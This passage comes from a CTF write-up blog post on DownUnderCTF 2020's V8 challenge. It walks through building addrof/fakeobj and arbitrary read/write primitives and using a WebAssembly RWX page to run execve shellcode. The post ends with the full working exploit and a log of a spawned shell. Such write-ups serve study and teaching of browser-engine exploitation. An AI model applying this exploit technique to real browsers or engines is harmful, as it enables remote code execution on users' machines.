address can be leaked somehow then we can write shellcode to it with the arb_write and then execute the function, we will create one with some garbage data which doesn\u0026rsquo;t even matter as long as it creates a RWX page. Now, what we will do from here is to first create a RWX page then find it via gef, the best way as I have learned from the other writeups is use debug version of d8 and then find it with some trial and error:-\nLet\u0026rsquo;s create a wasm function first and see the base address of the RWX page via vmmap, add the following lines of code to the xpl.js:-\nvar wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3, 130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131, 128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128, 128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0, 0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]); var wasm_module = new WebAssembly.Module(wasmCode); var wasm_instance = new WebAssembly.Instance(wasm_module); var pwn = wasm_instance.exports.main; Now, let\u0026rsquo;s run it with the debug version of d8 that we build:-\ngef➤ r --shell --allow-natives-syntax ~/CTFs/xpl.js Starting program: /home/d4mian/Pwning/v8/out.gn/x64.debug/d8 --shell --allow-natives-syntax ~/CTFs/wasm.js [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/l9221120237041090560nibthread_db.so.1\u0026#34;. [New Thread 0x7ffff2063700 (LWP 4436)] V8 version 8.7.0 (candidate) d8\u0026gt; ^C Thread 1 \u0026#34;d8\u0026#34; received signal SIGINT, Interrupt. -- snip -- gef➤ vmmap -- snip -- 0x0000379395694000 0x0000379395695000 0x0000000000000000 rwx 0x0000555555554000 0x00005555555e4000 0x0000000000000000 r-- /home/d4mian/Pwning/v8/out.gn/x64.debug/d8 0x00005555555e4000 0x000055555565e000 0x000000000008f000 r-x /home/d4mian/Pwning/v8/out.gn/x64.debug/d8 0x000055555565e000 0x0000555555661000 0x0000000000108000 r-- /home/d4mian/Pwning/v8/out.gn/x64.debug/d8 0x0000555555661000 0x0000555555662000 0x000000000010a000 rw- /home/d4mian/Pwning/v8/out.gn/x64.debug/d8 0x0000555555662000 0x0000555555747000 0x0000000000000000 rw- [heap] -- snip -- As we can see, we have the rwx segment at 0x0000379395694000, with some trial and error I found out that the using arb_read to the read data from the address wasm_instance + 0x68 shows us the address of the rwx_page, with this on hand and the power of arb_write we can write to the desirable address.\\\nNow, in order to write to the address, we have to write the initial value to the backing_store of the array, which is located at the address \u0026amp;JSArray + 0x14 which you can find with the debug version of the d8 binary. One more thing, we need to consider is to use the DataView and ArrayBuffer as this will help you in overwriting the address with the desired value, in short these two functions allows you to write the data in binary format using the ArrayBuffer.\nI am using the execve shellcode, since CTF is long over I can\u0026rsquo;t execute /chal/flagprinter, poor me.\nThe exploit now looks like:-\nvar arr_buf = new ArrayBuffer(0x100); var dataview = new DataView(arr_buf); var arr_buf_addr = addrof(arr_buf) \u0026amp; 0xffffffffn;; var back_store_addr = arb_read(arr_buf_addr + 0x14n); console.log(\u0026#34;[+] ArrayBuffer address: 0x\u0026#34; + arr_buf_addr.toString(16)); console.log(\u0026#34;[+] Back store pointer: 0x\u0026#34; + back_store_addr.toString(16)); arb_write(arr_buf_addr + 0x14n, rwx); var shellcode = [0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x0f, 0x05] for (let i = 0; i \u0026lt; shellcode.length; i++) { dataview.setUint8(i, shellcode[i], true); } console.log(\u0026#34;[+] Spawning shell\u0026#34;); pwn(); Now, running the exploit with the provided binary:-\nd4mian@pwnbox:~/CTFs$ ./d8 ./xpl.js [+] Float array map: 0x82438fd [+] Pointer to array elements: 0x8085e19 [+] Pointer to object array elements: 0x8085d5d [+] Object array map: 0x824394d [+] Controlled RW helper address: 0x8086209 [+] Wasm instance address: 0x821218d [+] RWX section address: 0x196c91043000 [+] ArrayBuffer address: 0x8086bd9 [+] Back store pointer: 0x560bcfd3d640 [+] Spawning shell... To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. d4mian@pwnbox:/home/d4mian/CTFs$ whoami d4mian d4mian@pwnbox:/home/d4mian/CTFs$ id uid=1000(d4mian) gid=1000(d4mian) groups=1000(d4mian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare) d4mian@pwnbox:/home/d4mian/CTFs$ ^C d4mian@pwnbox:/home/d4mian/CTFs$ exit Success, we spawned a shell. That was a long ride. Hope you enjoyed it.\nThe final exploit looks like:-\nvar aux_obj = {\u0026#34;a\u0026#34;: 1} var aux_obj_arr = [aux_obj]; var aux_float_arr = [1.1, 2.2, 3.3]; var aux_arr = aux_float_arr.slice(aux_float_arr) var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val, size) { f64_buf[0] = val; if(size == 32) { return BigInt(u64_buf[0]); } else if(size == 64) { return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u0026lt;\u0026lt; 32n); } } function itof(val, size) { if(size == 32) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); } else if(size == 64) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); u64_buf[1] = Number(val \u0026gt;\u0026gt; 32n); } return f64_buf[0]; } var flt_arr_map = ftoi(aux_arr[3], 32); var elem_arr_ptr = ftoi(aux_arr[4], 32); console.log(\u0026#34;[+] Float array map: 0x\u0026#34; + flt_arr_map.toString(16)); console.log(\u0026#34;[+] Pointer to array elements: 0x\u0026#34; + elem_arr_ptr.toString(16)); var elem_obj_arr = elem_arr_ptr - 0xc0n + 0x4n; aux_arr[4] = itof((ftoi(aux_arr[4], 64) \u0026amp; 0xffffffff00000000n) + elem_obj_arr, 64); console.log(\u0026#34;[+] Pointer to object array elements: 0x\u0026#34; + elem_obj_arr.toString(16)); var obj_arr_map = ftoi(aux_arr[0], 64) \u0026gt;\u0026gt; 32n; console.log(\u0026#34;[+] Object array map: 0x\u0026#34; + obj_arr_map.toString(16)); function addrof(obj) { aux_arr = aux_float_arr.slice(aux_float_arr) aux_arr[4] = itof((ftoi(aux_arr[4], 64) \u0026amp; 0xffffffff00000000n) + elem_obj_arr, 64); aux_obj_arr[0] = obj; return ftoi(aux_arr[0], 32) } function fakeobj(addr) { let fake; aux_arr = aux_float_arr.slice(aux_float_arr); aux_arr[0] = itof(addr, 32); aux_arr[3] = itof((ftoi(aux_arr[3], 64) \u0026amp; 0xffffffff00000000n) + obj_arr_map, 64); fake = aux_arr[0]; return fake; } var rw_helper = [itof(flt_arr_map, 64), 1.1, 2.2, 3.3]; var rw_helper_addr = addrof(rw_helper) \u0026amp; 0xffffffffn; console.log(\u0026#34;[+] Controlled RW helper address: 0x\u0026#34; + rw_helper_addr.toString(16)); function arb_read(addr) { let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); return ftoi(fake[0], 64); } function arb_write(addr, value) { let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); fake[0] = itof(value, 64); } var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3, 130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131, 128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128, 128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0, 0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]); var wasm_module = new WebAssembly.Module(wasmCode); var wasm_instance = new WebAssembly.Instance(wasm_module); var pwn = wasm_instance.exports.main; var wasm_instance_addr = addrof(wasm_instance) \u0026amp; 0xffffffffn; var rwx = arb_read(wasm_instance_addr + 0x68n); console.log(\u0026#34;[+] Wasm instance address: 0x\u0026#34; + wasm_instance_addr.toString(16)); console.log(\u0026#34;[+] RWX section address: 0x\u0026#34; + rwx.toString(16)); var arr_buf = new ArrayBuffer(0x100); var dataview = new DataView(arr_buf); var arr_buf_addr = addrof(arr_buf) \u0026amp; 0xffffffffn;; var back_store_addr = arb_read(arr_buf_addr + 0x14n); console.log(\u0026#34;[+] ArrayBuffer address: 0x\u0026#34; + arr_buf_addr.toString(16)); console.log(\u0026#34;[+] Back store pointer: 0x\u0026#34; + back_store_addr.toString(16)); arb_write(arr_buf_addr + 0x14n, rwx); var shellcode = [0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x0f, 0x05] for (let i = 0; i \u0026lt; shellcode.length; i++) { dataview.setUint8(i, shellcode[i], true); } console.log(\u0026#34;[+] Spawning a shell...\u0026#34;); pwn(); References # http://www.phrack.org/papers/attacking_javascript_engines.html http://phrack.org/papers/jit_exploitation.html https://gist.github.com/KaoRz/8d37865f94f73f240c562f9ab29ee1e2#file-pwn-js https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/ https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html ","date":"1 January 0001","permalink":"/posts/v8-pwn-downunderctf/","section":"Posts","summary":"In-depth write-up of the V8 challenge from DownUnderCTF 2020.\nForeword #Unfortunately I couldn\u0026rsquo;t solve the challenge, as it was supposed to be easy one still I couldn\u0026rsquo;t but I thought I should do a post with the writeups/exploits from other people and make it very explainative such that I can use for reference later so when I\u0026rsquo;ll get stucked I can take a look and move on with research and who knows maybe it\u0026rsquo;ll be helpful for others too.","title":"DownunderCTF: V8 Pwn"}]